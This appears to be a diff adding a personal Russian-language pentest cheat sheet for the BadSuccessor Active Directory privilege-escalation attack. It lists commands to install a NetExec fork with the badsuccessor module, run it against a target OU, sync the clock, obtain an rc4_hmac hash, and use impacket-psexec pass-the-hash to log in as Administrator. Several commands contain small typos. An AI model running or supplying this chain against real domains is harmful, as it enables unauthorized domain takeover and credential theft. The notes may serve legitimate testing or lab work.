@@ -1,0 +1,26 @@
+Badsuccessor
+
+nxc ldap domain.local -u user.local -p password -M badsuccessor --options
+нет модуля badsuccessor
+в issue  находим https://github.com/Pennyw0rth/NetExec/pull/1163
+
+https://github.com/azoxlpf/NetExec/tree/feat/refactor-badsuccessor - форк
+
+устанавливаем  форк
+uv tool install git+https://github.com/azoxlpf/NetExec.git@feat/refactor-badsuccessor
+export PATH="$HOME/.local/bin:$PATH"
+echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
+source ~/.bashrc
+
+└─$ ~/.local/bin/nxc ldap domain.local -user.local -p password -M badsuccessor --options
+[*] badsuccessor module options:
+~/.local/bin/nxc ldap domain.local -user.local -p password -M badsuccessor  (в выводе появится OU)
+nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local' 
+
+ синхронизация  времени
+sudo date -s "$(curl -Iv http://example.local 2>/dev/null|grep Date|sed's/Date: //g')"
+ri Apr 10 12:36:47 AM EDT 2026
+nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local' 
+получили rc4_hmac: hash
+
+impacket-psexec -hashes :5749875849578495 Administrator@domain.local
